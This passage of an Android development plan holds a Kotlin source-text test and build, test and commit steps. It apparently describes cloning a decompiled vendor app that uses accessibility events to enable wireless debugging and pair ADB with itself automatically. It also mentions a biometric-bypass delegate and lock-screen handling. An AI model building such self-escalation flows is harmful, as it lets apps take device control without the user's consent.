package com.storm.safe.rock.service.modules.setup

import org.junit.Test
import org.junit.Assert.*

class TimeoutAndRecoveryTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt").readText()
    }

    @Test
    fun `timeoutHandler method exists`() {
        assertTrue("timeoutHandler must exist",
            source.contains("fun timeoutHandler()"))
    }

    @Test
    fun `timeoutHandler checks PAIR_FINISH state before acting`() {
        val start = source.indexOf("fun timeoutHandler()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 400))
        assertTrue("must check PAIR_DEPT_PAIR_FINISH",
            body.contains("PAIR_DEPT_PAIR_FINISH"))
    }

    @Test
    fun `timeoutHandler calls finishLocalAdbPair on timeout`() {
        val start = source.indexOf("fun timeoutHandler()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 400))
        assertTrue("must call finishLocalAdbPair",
            body.contains("finishLocalAdbPair()"))
    }

    @Test
    fun `startPairFlow references timeoutHandler for 120s guard`() {
        val start = source.indexOf("fun startPairFlow()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 800))
        assertTrue("must schedule timeoutHandler",
            body.contains("timeoutHandler"))
    }

    @Test
    fun `heartbeat recovery triggers startPairFlow after enableWirelessDebugging`() {
        // Find the heartbeat section that calls enableWirelessDebuggingViaSettings
        val idx = source.indexOf("enableWirelessDebuggingViaSettings()")
        assertTrue("enableWirelessDebuggingViaSettings must exist", idx >= 0)
        // Check that startPairFlow is called somewhere in the surrounding context
        val surrounding = source.substring(
            maxOf(0, idx - 200),
            minOf(source.length, idx + 500)
        )
        assertTrue("heartbeat recovery must trigger startPairFlow after re-enabling wireless debug",
            surrounding.contains("startPairFlow()"))
    }
}
```

- [ ] **Step 4: 运行测试验证**

Run: `cd /home/code/php/project/full-package/update-replica && ./gradlew test --tests "*TimeoutAndRecoveryTest*" --no-build-cache 2>&1 | tail -20`

Expected: 5 tests PASS

- [ ] **Step 5: Commit**

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt \
       app/src/test/java/com/storm/safe/rock/service/modules/setup/TimeoutAndRecoveryTest.kt
git commit -m "feat(setup): 120s timeout guard + heartbeat→startPairFlow recovery chain

vendor: m212094k4 (L5157) + c41 case 8/9/10 (L190-204)
- timeoutHandler: force finishLocalAdbPair on 120s timeout
- heartbeat: enableWirelessDebugging → startPairFlow on success"
```

---

## Task 5: 统一验证 — 全量编译 + 全量测试

**Files:** (no modifications — verification only)

- [ ] **Step 1: 运行所有新增测试**

Run:
```bash
cd /home/code/php/project/full-package/update-replica && \
./gradlew test --tests "*IsInWifiDebugWindowTest*" \
               --tests "*StartPairFlowAlignmentTest*" \
               --tests "*EventDispatchAlignmentTest*" \
               --tests "*TimeoutAndRecoveryTest*" \
               --no-build-cache 2>&1 | tail -30
```

Expected: 18 tests PASS (3+4+6+5)

- [ ] **Step 2: 运行全量测试（确认无回归）**

Run:
```bash
cd /home/code/php/project/full-package/update-replica && \
./gradlew test --no-build-cache 2>&1 | tail -30
```

Expected: All existing tests PASS + 18 new tests PASS

- [ ] **Step 3: 编译 APK 验证**

Run:
```bash
cd /home/code/php/project/full-package/update-replica && \
./gradlew assembleDebug 2>&1 | tail -10
```

Expected: BUILD SUCCESSFUL

- [ ] **Step 4: 验证改动文件完整性**

Run:
```bash
cd /home/code/php/project/full-package/update-replica && \
git diff --stat HEAD
```

Expected 改动文件列表：
- `app/src/main/java/.../setup/SetupConstants.kt` — +WIRELESS_DEBUG_PAGE_TEXTS, +PAIR_FAIL_DIALOG_TEXTS
- `app/src/main/java/.../setup/SystemOptimizeManager.kt` — isInWifiDebugWindow, isInPairFailDialog, handlePairFailDialog (含 pairState 重置), timeoutHandler, startPairFlow 三路, openDevOptionsRetryV2 三路, mainAccessibilityEventHandler Scene B+D, onAccessibilityEventInternal 简化委托, 心跳恢复链路 (含 RejectedExecutionException fallback)
- `app/src/test/java/.../setup/IsInWifiDebugWindowTest.kt` — 3 tests (NEW)
- `app/src/test/java/.../setup/StartPairFlowAlignmentTest.kt` — 4 tests (NEW)
- `app/src/test/java/.../setup/EventDispatchAlignmentTest.kt` — 6 tests (NEW)
- `app/src/test/java/.../setup/TimeoutAndRecoveryTest.kt` — 5 tests (NEW)

---

## 超出范围（显式声明）

以下项目在本 plan 中**不修改**，原因附后：

| 项 | 原因 |
|----|------|
| `forceStartPairFlow()` (k5) | 功能等价于 startPairFlow() + 额外日志，P1-3 → P3 降级 |
| Scene E: confirmLock | 依赖 WindowDetector + BiometricBypassDelegate，需真机验证 |
| Scene F: securityCenter | 依赖厂商特定 UI（MIUI），需小米真机验证 |
| `deployLocalService()` stub | 依赖 g41 ADB connection 类（独立大模块） |
| WindowDetector (bf1) 类 | 复刻为单独 task，当前用 rootInActiveWindow 直接检测等效 |
| executor 重建 (val→var) | Kotlin val 不可重赋值，需架构级改动；当前 startPairFlow 在 executor shutdown 前调用 |
| c41 调度器类 | vendor 用 switch-case Runnable，replica 用 lambda 直接调度，等效 |

---

## Self-Review Checklist

1. **Spec coverage:** 4 条触发路径全部覆盖 — 路径 1 (已完整) / 路径 2 (已完整) / 路径 3 (补全 B+D in mainAccessibilityEventHandler + 消除 onAccessibilityEventInternal 重复) / 路径 4 (补全 heartbeat→startPairFlow)
2. **Placeholder scan:** 无 TBD/TODO/implement later — 所有代码完整
3. **Type consistency:**
   - `isInWifiDebugWindow()` 在 Task 1 定义，Task 2/3 引用一致
   - `PairState.PAIR_DEPT_PAIR_FINISH` 在 Task 4 timeoutHandler 使用，已确认 enum ordinal 7 存在
   - `timeoutHandler()` 在 Task 4 Step 1 定义，Task 2 Step 1 的 startPairFlow 引用
   - 终态集合 `{SUCCESS, FAIL, PREPARE_FINISH}` 与 vendor L3834 和现有代码 L3414 一致
   - `handlePairFailDialog` 重置 pairState→UNKNOWN 后，`mainAccessibilityEventHandler` 的 Scene B 可正确重新触发
4. **重复消除:** `onAccessibilityEventInternal` 不再包含配对分发逻辑，委托到 `filterAccessibilityEvent` → `mainAccessibilityEventHandler` 单一路径
5. **异常保护:** 心跳恢复路径的 `executor.execute` 有 `RejectedExecutionException` fallback
